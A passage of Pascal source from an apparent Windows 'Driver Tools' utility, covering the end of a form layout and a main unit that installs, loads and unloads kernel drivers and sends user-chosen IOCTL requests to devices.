          FFFE000000388007FFFC00000038000FFFFC000200100007FFFC007F00180000
          FFFC00FF801C0000FFFC00FF803C0E00FFFE01FFC0F80F00FFFF81FFE3E00F03
          FFFFF3FFFFE00E03FFFFFFFFFFF00003FFFFFFFFFFF00001FFFFFFFFFFFE0000
          FFFFFFFFFFFE0001FFFFFFFFFFFE0013FFFFFFFFFFFE003FFFFFFFFFFFFF183F
          FFFFFFFFFFFFBC3F
        }
      end
      object Label12: TLabel
        Left = 96
        Height = 15
        Top = 8
        Width = 206
        Caption = 'Driver Tools for Windows 7/8/8.1/10/11'
        ParentColor = False
      end
      object Label13: TLabel
        Left = 96
        Height = 15
        Top = 40
        Width = 220
        Caption = '(c) 2021-2022 Driver Tools Project Authors'
        ParentColor = False
      end
      object Label14: TLabel
        Left = 96
        Height = 15
        Top = 66
        Width = 277
        Caption = 'This program is freeware. You use it at your own risk.'
        ParentColor = False
      end
      object GroupBox4: TGroupBox
        AnchorSideRight.Control = AboutSheet
        AnchorSideRight.Side = asrCenter
        Left = 8
        Height = 105
        Top = 104
        Width = 581
        Anchors = [akTop, akLeft, akRight]
        Caption = 'Build information'
        ClientHeight = 85
        ClientWidth = 577
        TabOrder = 0
        object Label15: TLabel
          Left = 8
          Height = 15
          Top = 8
          Width = 41
          Caption = 'Version:'
          ParentColor = False
        end
        object VersionLabel: TLabel
          Left = 112
          Height = 15
          Top = 8
          Width = 24
          Caption = '1.0.0'
          ParentColor = False
        end
        object Label26: TLabel
          Left = 8
          Height = 15
          Top = 32
          Width = 52
          Caption = 'Compiler:'
          ParentColor = False
        end
        object CompilerLabel: TLabel
          Left = 112
          Height = 15
          Top = 32
          Width = 24
          Caption = 'GCC'
          ParentColor = False
        end
        object Label28: TLabel
          Left = 8
          Height = 15
          Top = 56
          Width = 56
          Caption = 'Build date:'
          ParentColor = False
        end
        object BuildDateLabel: TLabel
          Left = 112
          Height = 15
          Top = 56
          Width = 46
          Caption = '01/01/01'
          ParentColor = False
        end
      end
      object GroupBox5: TGroupBox
        AnchorSideRight.Control = AboutSheet
        AnchorSideRight.Side = asrCenter
        Left = 8
        Height = 105
        Top = 216
        Width = 582
        Anchors = [akTop, akLeft, akRight]
        Caption = 'Operating system'
        ClientHeight = 85
        ClientWidth = 578
        TabOrder = 1
        object Label30: TLabel
          Left = 8
          Height = 15
          Top = 8
          Width = 35
          Caption = 'Name:'
          ParentColor = False
        end
        object OSNameLabel: TLabel
          Left = 112
          Height = 15
          Top = 8
          Width = 49
          Caption = 'Windows'
          ParentColor = False
        end
      end
    end
  end
  object StatusBar1: TStatusBar
    Left = 0
    Height = 23
    Top = 671
    Width = 606
    Panels = <>
  end
  object PageControl3: TPageControl
    Left = 0
    Height = 200
    Top = 471
    Width = 606
    ActivePage = TabSheet1
    Align = alBottom
    TabIndex = 0
    TabOrder = 2
    object TabSheet1: TTabSheet
      Caption = 'Log'
      ClientHeight = 172
      ClientWidth = 598
      object MemoLog: TMemo
        Left = 0
        Height = 172
        Top = 0
        Width = 598
        Align = alClient
        ReadOnly = True
        ScrollBars = ssBoth
        TabOrder = 0
      end
    end
  end
  object OpenDialog1: TOpenDialog
    Filter = 'Drivers (*.sys)|*.sys|All files (*.*)|*.*'
    Options = [ofPathMustExist, ofEnableSizing, ofViewDetail]
    Left = 19
    Top = 505
  end
  object SaveDialog1: TSaveDialog
    Filter = 'All files (*.*)|*.*'
    Options = [ofOverwritePrompt, ofPathMustExist, ofEnableSizing, ofViewDetail]
    Left = 88
    Top = 504
  end
end

```

`source/DrvTools/src/unit1.pas`:

```pas
{*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2021 - 2022
*
*  TITLE:       Unit1.pas
*
*  VERSION:     1.00
*
*  DATE:        27 Mar 2022
*
*  MainForm implementation.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************}
unit Unit1;

{$mode objfpc}{$H+}
{ignore nonmeaningful warnings}
{$WARN 5024 off : Parameter "$1" not used}
{$WARN 4055 off : Conversion between ordinals and pointers is not portable}
interface

uses
  Windows, ShellApi, Classes, SysUtils, Forms, Controls, Graphics,
  Dialogs, StdCtrls, ComCtrls,
  ExtCtrls, EditBtn, Spin, Buttons, LazFileUtils, scmsup, nativesup, Types;

type

  TChangeWindowMessageFilter = function(msg: cardinal; Action: Dword): BOOL; stdcall;

  { TMainForm }

  TMainForm = class(TForm)
    BitBtn1: TBitBtn;
    ButtonCallDriver: TButton;
    ButtonInBufferBrowse: TButton;
    ButtonIoctlReset: TButton;
    ButtonNativeUnload: TButton;
    ButtonOutBufferBrowse: TButton;
    ButtonScmRemove: TButton;
    ButtonNativeRemove: TButton;
    ButtonNativeInstall: TButton;
    ButtonNativeOpenFile: TButton;
    ButtonNativeLoad: TButton;
    ButtonScmUnload: TButton;
    ButtonScmLoad: TButton;
    ButtonScmInstall: TButton;
    ButtonScmOpenFile: TButton;
    CheckBoxFillByte: TCheckBox;
    CheckBoxForceLoad: TCheckBox;
    CheckBoxOutBuffer: TCheckBox;
    CheckBoxSymLink: TCheckBox;
    CheckBoxUseFiles: TCheckBox;
    EditDeviceName: TComboBox;
    ComboBoxIoAccess: TComboBox;
    ComboBoxIoMethod: TComboBox;
    ComboBoxScmErrorControl: TComboBox;
    ComboBoxNativeErrorControl: TComboBox;
    ComboBoxScmStartType: TComboBox;
    ComboBoxNativeStartType: TComboBox;
    EditDevType: TEdit;
    EditFunctionId: TEdit;
    EditInBufferName: TEdit;
    EditIoctlFill: TEdit;
    EditIoctlValue: TEdit;
    EditNativeSymLink: TEdit;
    EditOutBufferName: TEdit;
    EditScmDisplayName: TEdit;
    EditNativeDisplayName: TEdit;
    EditNativeFileName: TEdit;
    EditScmName: TEdit;
    EditScmFileName: TEdit;
    EditNativeName: TEdit;
    GroupBox1: TGroupBox;
    GroupBox2: TGroupBox;
    GroupBox3: TGroupBox;
    GroupBox4: TGroupBox;
    GroupBox5: TGroupBox;
    GroupBox7: TGroupBox;
    GroupBox9: TGroupBox;
    Image1: TImage;
    Label1: TLabel;
    Label10: TLabel;
    Label11: TLabel;
    Label12: TLabel;
    Label13: TLabel;
    Label14: TLabel;
    Label15: TLabel;
    VersionLabel: TLabel;
    Label17: TLabel;
    Label18: TLabel;
    Label19: TLabel;
    Label2: TLabel;
    Label20: TLabel;
    Label21: TLabel;
    Label22: TLabel;
    Label23: TLabel;
    Label24: TLabel;
    Label25: TLabel;
    Label26: TLabel;
    CompilerLabel: TLabel;
    Label28: TLabel;
    BuildDateLabel: TLabel;
    Label30: TLabel;
    OSNameLabel: TLabel;
    LabelPrivInfo: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    Label5: TLabel;
    Label6: TLabel;
    Label7: TLabel;
    Label8: TLabel;
    Label9: TLabel;
    LabelPrivInfoScm: TLabel;
    ListViewPrivSet: TListView;
    MemoLog: TMemo;
    OpenDialog1: TOpenDialog;
    PageControl1: TPageControl;
    PageControl2: TPageControl;
    PageControl3: TPageControl;
    SaveDialog1: TSaveDialog;
    ScmTabSheet: TTabSheet;
    NativeTabSheet: TTabSheet;
    IoctlSheet: TTabSheet;
    OptionsSheet: TTabSheet;
    SpinEditInputBuffer: TSpinEdit;
    SpinEditOutputBuffer: TSpinEdit;
    StatusBar1: TStatusBar;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    AboutSheet: TTabSheet;
    procedure AboutSheetShow(Sender: TObject);
    procedure ButtonCallDriverClick(Sender: TObject);
    procedure ButtonInBufferBrowseClick(Sender: TObject);
    procedure ButtonIoctlResetClick(Sender: TObject);
    procedure ButtonNativeInstallClick(Sender: TObject);
    procedure ButtonNativeLoadClick(Sender: TObject);
    procedure ButtonNativeRemoveClick(Sender: TObject);
    procedure ButtonNativeUnloadClick(Sender: TObject);
    procedure ButtonScmInstallClick(Sender: TObject);
    procedure CheckBoxOutBufferChange(Sender: TObject);
    procedure CheckBoxSymLinkClick(Sender: TObject);
    procedure CheckBoxUseFilesChange(Sender: TObject);
    procedure EditDevTypeKeyUp(Sender: TObject; var Key: word; Shift: TShiftState);
    procedure EditIoCtlCodeKeyPress(Sender: TObject; var Key: char);
    procedure EditIoctlValueChange(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormDropFiles(Sender: TObject; const FileNames: array of string);
    procedure Image1Click(Sender: TObject);
    procedure IoctlSheetShow(Sender: TObject);
    procedure ListViewPrivSetMouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: integer);
    procedure NativeTabSheetHide(Sender: TObject);
    procedure NativeTabSheetShow(Sender: TObject);
    procedure OptionsSheetShow(Sender: TObject);
    procedure ScmTabSheetShow(Sender: TObject);
    procedure ShowStatus(Status: DWORD);
    procedure ShowStatus(Status: NTSTATUS); overload;
    procedure PrintToLog(LogEntry: string);
    procedure ManageInstalledDriverSCM(Sender: TObject);
    procedure ButtonOpenFileClick(Sender: TObject);
    procedure SpinEditInputBufferChange(Sender: TObject);
    procedure BuildIoCtl(Sender: TObject);
    procedure ElevateButtonClick(Sender: TObject);
  private

  public
    IsFullAdmin: boolean;
  end;

const
  BCM_SETSHIELD = $160C;

const
  PROGRAM_VERSION_MAJOR = 1;
  PROGRAM_VERSION_MINOR = 0;
  PROGRAM_VERSION_BUILD = 2205;
  PROGRAM_COMPILER = 'Lazarus FPC v';

var
  MainForm: TMainForm;
  g_DataBuffer: PChar = nil;
  g_DataSize: DWORD = 0;

implementation

const
  RTL_16MEG: DWORD = (1024 * 1024) * 16;
  DefaultExt: string = '.*.sys';
  DefaultDialogFilter: string = 'All files (*.*)|*.*';
  DrvLoadDialogFilter: string = 'Drivers (*.sys)|*.sys|All files (*.*)|*.*';

{$R *.lfm}
function RunAsAdmin(const ParentWindow: HWND; const FileName: string;
  const Parameters: string): boolean;
var
  sei: TShellExecuteInfoW;
begin

  ZeroMemory(@sei, SizeOf(sei));

  with sei do
  begin
    cbSize := SizeOf(sei);
    Wnd := ParentWindow;
    fMask := SEE_MASK_FLAG_DDEWAIT or SEE_MASK_FLAG_NO_UI;
    lpVerb := 'runas';
    lpFile := PWideChar(WideString(Filename));
    if Parameters <> '' then
      lpParameters := PWideChar(WideString(Parameters));
    nShow := SW_SHOWNORMAL;
  end;

  Result := ShellExecuteExW(@sei);
end;

function IsCurrentUserFullAdmin(): boolean;
const
  NtAuthority: TSidIdentifierAuthority = (Value: (0, 0, 0, 0, 0, 5));
var
  adminSid: Pointer;
  tokenHandle: THandle;
  i: integer;
  ptkGroups: PTokenGroups;
  dwLength, dwAttributes: DWORD;
begin

  Result := False;
  tokenHandle := 0;
  adminSid := nil;
  dwLength := 0;
  ptkGroups := nil;

  try

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, tokenHandle)) then
    begin

      Win32Check(AllocateAndInitializeSid(NtAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0,
        0, 0, 0, 0, adminSid));

      if (GetTokenInformation(tokenHandle, TokenGroups, nil, 0, @dwLength)) or
        (GetLastError <> ERROR_INSUFFICIENT_BUFFER) then
        RaiseLastOsError();

      ptkGroups := PTokenGroups(AllocMem(dwLength));

      Win32Check(GetTokenInformation(tokenHandle, TokenGroups,
        ptkGroups, dwLength, @dwLength));

      {$r-}//range check off for anysize array
      for i := 0 to ptkGroups^.GroupCount - 1 do
      begin
        if (EqualSid(adminSid, ptkGroups^.Groups[i].Sid)) then
        begin

          dwAttributes := ptkGroups^.Groups[i].Attributes;
          if ((dwAttributes and SE_GROUP_ENABLED) = SE_GROUP_ENABLED) then
            if ((dwAttributes and SE_GROUP_USE_FOR_DENY_ONLY) <>
              SE_GROUP_USE_FOR_DENY_ONLY) then
            begin
              Result := True;
              break;
            end;

        end;
      end;
      {$r+}
    end;

  finally
    if (tokenHandle <> 0) then
      CloseHandle(tokenHandle);
    if (adminSid <> nil) then
      FreeSid(adminSid);
    if (ptkGroups <> nil) then
      FreeMem(ptkGroups);
  end;

end;

function ReadInputBuffer(FileName: string; var Buffer: PChar;
  var BufferSize: DWORD): boolean;
var
  fileHandle: THandle;
  bytesIO: DWORD;
begin
  Result := False;

  fileHandle := CreateFileW(PWideChar(WideString(FileName)), GENERIC_READ,
    FILE_SHARE_READ, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

  if (fileHandle <> INVALID_HANDLE_VALUE) then
  begin

    BufferSize := GetFileSize(fileHandle, nil);

    if (BufferSize > 0) and (BufferSize < RTL_16MEG) then
    begin
      Buffer := PChar(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BufferSize));
      if (Buffer <> nil) then
      begin
        bytesIO := 0;
        if (_ReadFile(fileHandle, Buffer, BufferSize, @bytesIO, nil)) then
        begin
          Result := (bytesIO = BufferSize);
        end;
      end;
    end
    else
    begin
      if (BufferSize = 0) then
        SetLastError(ERROR_INSUFFICIENT_BUFFER)
      else
      if (BufferSize >= RTL_16MEG) then
        SetLastError(ERROR_BUFFER_OVERFLOW);
    end;

    CloseHandle(fileHandle);

  end;
end;

function WriteOutputBuffer(FileName: string; lpBuffer: PChar;
  BufferSize: DWORD): boolean;
var
  fileHandle: THandle;
  bytesIO: DWORD;
begin
  Result := False;

  fileHandle := CreateFileW(PWideChar(WideString(FileName)), GENERIC_WRITE,
    0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

  if (fileHandle <> INVALID_HANDLE_VALUE) then
  begin
    bytesIO := 0;
    if (_WriteFile(fileHandle, lpBuffer, BufferSize, @bytesIO, nil)) then
      Result := (bytesIO = BufferSize);

    CloseHandle(fileHandle);
  end;
end;

function IoctlToCode(DeviceType, FunctionCode, Method, Access: longword): longword;
begin
  Result := (DeviceType shl 16) or (Access shl 14) or (FunctionCode shl 2) or Method;
end;

function HexToDword(S: string): longword;
var
  HexStr: string;
begin
  if Pos('$', S) = 0 then
    HexStr := '$' + S
  else
    HexStr := S;

  Result := StrToDword(HexStr);
end;

{ TMainForm }
procedure TMainForm.ElevateButtonClick(Sender: TObject);
begin
  RunAsAdmin(GetParent(MainForm.Handle), Application.ExeName,
    IntToStr(PageControl1.ActivePageIndex));
  MainForm.Close();
end;

function ObjectEnumProc(Entry: POBJECT_DIRECTORY_INFORMATION;
  Context: PEnumObjectsContext): BOOL; stdcall;
var
  pusTypeName: PUNICODE_STRING;
begin
  pusTypeName := PUNICODE_STRING(Context^.UserContext);
  if (RtlEqualUnicodeString(@Entry^.TypeName, pusTypeName, True)) then
  begin
    MainForm.EditDeviceName.Items.Add(Context^.ObjectPathName);
  end;

  Result := False;
end;

procedure TMainForm.BuildIoctl(Sender: TObject);
var
  ioctl, devtype, method, funcid, access: DWORD;
begin
  devtype := HexToDword(EditDevType.Text);
  method := ComboBoxIoMethod.ItemIndex;
  funcid := HexToDword(EditFunctionId.Text);
  access := ComboBoxIoAccess.ItemIndex;
  ioctl := IoctlToCode(devtype, funcid, method, access);
  EditIoctlValue.Text := IntToHex(ioctl, 8);
end;

procedure TMainForm.ButtonOpenFileClick(Sender: TObject);
var
  drvNameNotExt, drvName: string;
begin
  if (PageControl1.ActivePage <> ScmTabSheet) and
    (PageControl1.ActivePage <> NativeTabSheet) then
  begin
    exit;
  end;

  OpenDialog1.Filter := DrvLoadDialogFilter;
  OpenDialog1.DefaultExt := DefaultExt;
  if OpenDialog1.Execute() then
  begin

    drvName := ExtractFileName(OpenDialog1.FileName);
    drvNameNotExt := ExtractFileNameWithoutExt(drvName);

    if (PageControl1.ActivePage = ScmTabSheet) then
    begin
      EditScmFileName.Text := OpenDialog1.FileName;
      if (EditScmDisplayName.Text = '') then
        EditScmDisplayName.Text := drvName;
      if (EditScmName.Text = '') then
        EditScmName.Text := drvNameNotExt;
    end
    else
    if (PageControl1.ActivePage = NativeTabSheet) then
    begin
      EditNativeFileName.Text := OpenDialog1.FileName;
      if (EditNativeDisplayName.Text = '') then
        EditNativeDisplayName.Text := drvName;
      if (EditNativeName.Text = '') then
        EditNativeName.Text := drvNameNotExt;
    end;

  end;
end;

procedure TMainForm.SpinEditInputBufferChange(Sender: TObject);
begin
  if (CheckBoxOutBuffer.Checked) then
    SpinEditOutputBuffer.Value := SpinEditInputBuffer.Value;
end;

procedure TMainForm.ManageInstalledDriverSCM(Sender: TObject);
var
  schSCManager: SC_HANDLE;
  scmStatus: DWORD;
  drvName: PChar;
  drvEntryName: string;
begin

  drvEntryName := EditScmName.Text;

  //mandatory
  if (drvEntryName = '') then
  begin
    ShowStatus(ERROR_INVALID_SERVICENAME);
    exit;
  end;

  scmStatus := ERROR_SUCCESS;
  schSCManager := 0;

  try

    drvName := PChar(drvEntryName);

    if scmOpenManager(SC_MANAGER_ALL_ACCESS, schSCManager, scmStatus) then
    begin

      case TComponent(Sender).Tag of
        1:  //start
        begin
          MemoLog.Lines.Add('Loading driver: ' + drvEntryName);
          scmStartDriver(schSCManager, drvName, scmStatus);
        end;
        2:  //stop
        begin
          MemoLog.Lines.Add('Unloading driver: ' + drvEntryName);
          scmStopDriver(schSCManager, drvName, scmStatus);
        end;

        3: //remove
        begin
          MemoLog.Lines.Add('Removing driver entry: ' + drvEntryName);
          scmRemoveDriver(schSCManager, drvName, scmStatus);
        end;
        else
          scmStatus := ERROR_INVALID_PARAMETER;
      end;
    end;

  finally
    ShowStatus(scmStatus);
    scmCloseManager(schSCManager, scmStatus);
  end;

end;

procedure TMainForm.PrintToLog(LogEntry: string);
begin
  MemoLog.Lines.Add(LogEntry);
end;

procedure TMainForm.ShowStatus(Status: DWORD);
var
  lpMsgBuf: HLOCAL;
  l: ULONG;
begin
  lpMsgBuf := 0;

  l := FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER or FORMAT_MESSAGE_FROM_SYSTEM,
    nil, Status, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), PChar(@lpMsgBuf), 0, nil);

  if (l <> 0) then
  begin
    PrintToLog(Format('Error code: %d', [Status]) + Format(' [0x%x]', [Status]));
    PrintToLog(PChar(lpMsgBuf));
    LocalFree(lpMsgBuf);
  end;

end;

procedure TMainForm.ShowStatus(Status: NTSTATUS);
var
  lpMsgBuf: HLOCAL;
  r, l: ULONG;
  hDll: HMODULE;
begin
  lpMsgBuf := 0;

  r := Status and FACILITY_NT_BIT;

  // hr to exception
  if (r <> 0) then
    r := DWORD(Status and not FACILITY_NT_BIT)
  else
    r := DWORD(Status);

  hDll := GetModuleHandle(ntdll);
  l := FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER or
    FORMAT_MESSAGE_FROM_HMODULE, LPCVOID(hDll), r,
    MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), PChar(@lpMsgBuf), 0, nil);

  if (l <> 0) then
  begin
    PrintToLog(Format('Error code: %d', [Status]) + Format(' [0x%x]', [Status]));
    PrintToLog(PChar(lpMsgBuf));
    LocalFree(lpMsgBuf);
  end;

end;

procedure TMainForm.ButtonNativeInstallClick(Sender: TObject);
var
  StartType: DWORD;
  ErrorControl: DWORD;
  DisplayName: PWideChar;
  DrvName: PWideChar;
  ImagePath: PWideChar;
  SymLink: PWideChar;
  Status: NTSTATUS;
  SymLinkHandle: THANDLE;
  bSymLink: boolean;
  S: string;
  drvEntryName: string;
begin

  drvEntryName := EditNativeName.Text;

  //mandatory
  if (drvEntryName = '') then
  begin
    ShowStatus(STATUS_OBJECT_NAME_NOT_FOUND);
    exit;
  end;

  bSymLink := CheckBoxSymLink.Checked;

  if (bSymLink) then
  begin

    if (EditNativeSymLink.Text = '') then
    begin
      PrintToLog('Specify symbolic link name');
      exit;
    end;

    SymLink := PWideChar(WideString(EditNativeSymLink.Text));

    PrintToLog('Installing driver entry: ' + drvEntryName +
      ' using symbolic link ' + EditNativeSymLink.Text);
  end
  else
  begin
    PrintToLog('Installing driver entry: ' + drvEntryName);
  end;


  DisplayName := nil;
  ImagePath := nil;

  StartType := ComboBoxNativeStartType.ItemIndex;
  ErrorControl := ComboBoxNativeErrorControl.ItemIndex;

  if (EditNativeDisplayName.Text <> '') then
  begin
    DisplayName := PWideChar(WideString(EditNativeDisplayName.Text));
  end;

  if (EditNativeFileName.Text <> '') then
  begin
    ImagePath := PWideChar(WideString(EditNativeFileName.Text));
  end;

  try

    S := Format(WIN32_CURRENTCONTROL_SERVICES, [drvEntryName]);

  except
    ShowStatus(STATUS_INTERNAL_ERROR);
    exit;
  end;

  DrvName := PWideChar(WideString(S));

  if (bSymLink) then
  begin
    SymLinkHandle := 0;
    Status := ntsupCreateSymbolicLink(SymLinkHandle, SymLink, ImagePath);
    if (NT_SUCCESS(Status)) then
    begin
      Status := ntsupCreateDriverEntry(DrvName, ErrorControl, StartType,
        SymLink, DisplayName, False);
    end;
  end
  else
  begin
    Status := ntsupCreateDriverEntry(DrvName, ErrorControl, StartType,
      ImagePath, DisplayName, True);
  end;

  ShowStatus(Status);

end;

procedure TMainForm.ButtonInBufferBrowseClick(Sender: TObject);
var
  lpBuffer: PChar;
  BufferSize: DWORD;
begin
  case TComponent(Sender).Tag of
    1:
    begin
      OpenDialog1.Filter := DefaultDialogFilter;
      if (OpenDialog1.Execute) then
      begin
        lpBuffer := nil;
        BufferSize := 0;

        if (ReadInputBuffer(OpenDialog1.FileName, lpBuffer, BufferSize)) then
        begin
          if (g_DataBuffer <> nil) then
          begin
            HeapFree(GetProcessHeap(), 0, g_DataBuffer);
          end;
          g_DataBuffer := lpBuffer;
          g_DataSize := BufferSize;
          SpinEditInputBuffer.Value := BufferSize;
        end
        else
          ShowStatus(GetLastError());

        EditInBufferName.Text := OpenDialog1.FileName;
      end;
    end;
    2:
    begin
      SaveDialog1.Filter := DefaultDialogFilter;
      if (SaveDialog1.Execute) then
      begin
        EditOutBufferName.Text := SaveDialog1.FileName;
        if CheckBoxOutBuffer.Checked then
        begin
          CheckBoxOutBuffer.Checked := False;
          SpinEditOutputBuffer.Enabled := True;
          SpinEditOutputBuffer.Value := 0;
        end;
      end;
    end;
    else
      exit;
  end;

end;

procedure TMainForm.ButtonCallDriverClick(Sender: TObject);
var
  Status: NTSTATUS;
  SingleBuffer: boolean;
  processHeap, devHandle: THandle;
  IoControlCode: DWORD;
  InputSize, OutputSize, sz: DWORD;
  devName, s: string;
  InputBuffer, OutputBuffer: PChar;
  iost: IO_STATUS_BLOCK;
  dwError: DWORD;
  k: byte;
begin

  try

    processHeap := GetProcessHeap();

    SingleBuffer := CheckBoxOutBuffer.Checked;

    // Read DeviceName
    devName := EditDeviceName.Text;
    if (devName = '') then
    begin
      PrintToLog('Device name is not specified');
      exit;
    end;

    // Read IOCTL value
    s := EditIoctlValue.Text;
    if (s = '') then
    begin
      PrintToLog('Control code is not specified');
      exit;
    end;

    IoControlCode := HexToDword(s);

    // Open device handle
    devHandle := 0;
    Status := ntsupOpenDeviceEx(PWideChar(WideString(devName)),
      GENERIC_READ or GENERIC_WRITE, devHandle);
    if (not NT_SUCCESS(Status)) then
    begin
      PrintToLog('Failed to open ' + devName);
      ShowStatus(Status);
      exit;
    end;

    // Allocate input buffer
    InputSize := SpinEditInputBuffer.Value;
    if (InputSize <> 0) then
    begin
      InputBuffer := PChar(HeapAlloc(processHeap, HEAP_ZERO_MEMORY, InputSize));
      if (InputBuffer = nil) then
      begin
        dwError := GetLastError();
        PrintToLog('InputBuffer is NULL');
        ShowStatus(dwError);
      end;
    end
    else
    begin
      InputBuffer := nil;
    end;

    // In/out buffers are the same
    if (SingleBuffer) then
    begin
      OutputBuffer := InputBuffer;
      OutputSize := InputSize;
    end
    else
    begin

      // Allocate ouput buffer
      OutputSize := SpinEditOutputBuffer.Value;
      if (OutputSize <> 0) then
      begin
        OutputBuffer := PChar(HeapAlloc(processHeap, HEAP_ZERO_MEMORY, OutputSize));
        if (OutputBuffer = nil) then
        begin
          dwError := GetLastError();
          PrintToLog('OutputBuffer is NULL');
          ShowStatus(dwError);
        end;
      end
      else
      begin
        OutputBuffer := nil;
      end;

    end;

    // Fill Byte is checked
    if (CheckBoxFillByte.Checked) then
    begin
      if ((InputBuffer <> nil) and (InputSize > 0)) then
      begin
        s := EditIoctlFill.Text;
        k := byte(HexToDword(s));
        FillMemory(InputBuffer, InputSize, k);
      end;
    end
    else
    begin
      // Otherwise use supplied data from file
      sz := InputSize;
      if (sz > g_DataSize) then
        sz := g_DataSize;

      CopyMemory(InputBuffer, g_DataBuffer, sz);

    end;

    // Call driver
    ZeroMemory(@iost, sizeof(iost));
    Status := NtDeviceIoControlFile(devHandle, 0, nil, nil, @iost,
      IoControlCode, InputBuffer, InputSize, OutputBuffer, OutputSize);

    // Free resources
    NtClose(devHandle);

    PrintToLog('NtDeviceIoControlFile(' + devName + ') result: ');
    ShowStatus(Status);

    if (NT_SUCCESS(Status)) then
    begin
      s := EditOutBufferName.Text;
      if ((s <> '') and (OutputBuffer <> nil)) then
        if (not WriteOutputBuffer(s, OutputBuffer, OutputSize)) then
        begin
          ShowStatus(GetLastError());
        end;
    end;

    if (not SingleBuffer) then
      HeapFree(processHeap, 0, OutputBuffer);

    HeapFree(processHeap, 0, InputBuffer);

  except
    on E: Exception do
    begin
      PrintToLog(E.Message);
    end;
  end;
end;

procedure TMainForm.AboutSheetShow(Sender: TObject);
var
  osver: OSVERSIONINFOW;
begin
  VersionLabel.Caption := IntToStr(PROGRAM_VERSION_MAJOR) + '.' +
    IntToStr(PROGRAM_VERSION_MINOR) + '.' + IntToStr(PROGRAM_VERSION_BUILD);

  CompilerLabel.Caption := PROGRAM_COMPILER + {$I %FPCVERSION%};
  BuildDateLabel.Caption := {$I %DATE% } + ' ' + {$I %TIME%};

  ZeroMemory(@osver, sizeof(osver));
  RtlGetVersion(@osver);

  OSNameLabel.Caption := 'Windows NT ' + IntToStr(osver.dwMajorVersion) +
    '.' + IntToStr(osver.dwMinorVersion) + '.' + IntToStr(osver.dwBuildNumber);
end;

procedure TMainForm.ButtonIoctlResetClick(Sender: TObject);
begin
  SpinEditInputBuffer.Value := 0;
  SpinEditOutputBuffer.Value := 0;
  CheckBoxFillByte.Checked := False;
  EditIoctlFill.Text := 'a';
  CheckBoxOutBuffer.Checked := False;
  CheckBoxUseFiles.Checked := False;
  if (g_DataBuffer <> nil) then
  begin
    HeapFree(GetProcessHeap(), 0, g_DataBuffer);
    g_DataBuffer := nil;
    g_DataSize := 0;
  end;
end;

procedure TMainForm.ButtonNativeLoadClick(Sender: TObject);
var
  Status: NTSTATUS;
  bForceLoad: boolean;
  drvName: string;
begin
  bForceLoad := CheckBoxForceLoad.Checked;
  drvName := EditNativeName.Text;

  //mandatory
  if (drvName = '') then
  begin
    ShowStatus(STATUS_OBJECT_NAME_NOT_FOUND);
    exit;
  end;

  drvName := EditNativeName.Text;

  PrintToLog('Loading driver: ' + drvName);
  if (bForceLoad) then
    PrintToLog('Unload previous instance enabled');

  Status := ntsupLoadDriver(PWideChar(WideString(drvName)), bForceLoad);

  ShowStatus(Status);
end;

procedure TMainForm.ButtonNativeRemoveClick(Sender: TObject);
var
  Status: NTSTATUS;
  drvName: string;
begin

  drvName := EditNativeName.Text;

  //mandatory
  if (drvName = '') then
  begin
    ShowStatus(STATUS_OBJECT_NAME_NOT_FOUND);
    exit;
  end;

  PrintToLog('Removing driver entry: ' + drvName);

  Status := ntsupRemoveDriverEntry(PWideChar(WideString(drvName)));
  ShowStatus(Status);
end;

procedure TMainForm.ButtonNativeUnloadClick(Sender: TObject);
var
  Status: NTSTATUS;
  drvName: string;
begin
  drvName := EditNativeName.Text;

  //mandatory
  if (drvName = '') then
  begin
    ShowStatus(STATUS_OBJECT_NAME_NOT_FOUND);
    exit;
  end;

  PrintToLog('Unloading driver: ' + drvName);

  Status := ntsupUnloadDriver(PWideChar(WideString(drvName)));
  ShowStatus(Status);

  if (Status = STATUS_OBJECT_NAME_NOT_FOUND) then
  begin
    PrintToLog(
      'Hint: It is possible that driver entry in registry deleted/not exist.' +
      #13#10'In this case you can use "Install" button to create new.');
  end;
end;

procedure TMainForm.ButtonScmInstallClick(Sender: TObject);
var
  schSCManager: SC_HANDLE;
  scmStatus: DWORD;
  drvName, displayName, binaryPath: PChar;
  drvEntryName: string;
begin

  drvEntryName := EditScmName.Text;

  //mandatory
  if (drvEntryName = '') then
  begin
    ShowStatus(ERROR_INVALID_SERVICENAME);
    exit;
  end;

  //mandatory
  if (EditScmFileName.Text = '') then
  begin
    ShowStatus(ERROR_FILE_NOT_FOUND);
    exit;
  end;

  scmStatus := ERROR_SUCCESS;
  schSCManager := 0;
  PrintToLog('Installing driver entry: ' + drvEntryName);

  try

    drvName := PChar(drvEntryName);
    binaryPath := PChar(EditScmFileName.Text);

    //optional
    if (EditScmDisplayName.Text = '') then
      displayName := nil
    else
      displayName := PChar(EditScmDisplayName.Text);

    if (scmOpenManager(SC_MANAGER_ALL_ACCESS, schSCManager, scmStatus)) then
    begin
      scmInstallDriver(schSCManager, drvName, displayName,
        ComboBoxScmStartType.ItemIndex, ComboBoxScmErrorControl.ItemIndex,
        binaryPath, scmStatus);
    end;

    ShowStatus(scmStatus);

  finally
    scmCloseManager(schSCManager, scmStatus);
  end;

end;

procedure TMainForm.CheckBoxOutBufferChange(Sender: TObject);
begin
  if (CheckBoxOutBuffer.Checked) then
    SpinEditOutputBuffer.Value := SpinEditInputBuffer.Value;
  SpinEditOutputBuffer.Enabled := not CheckBoxOutBuffer.Checked;
end;

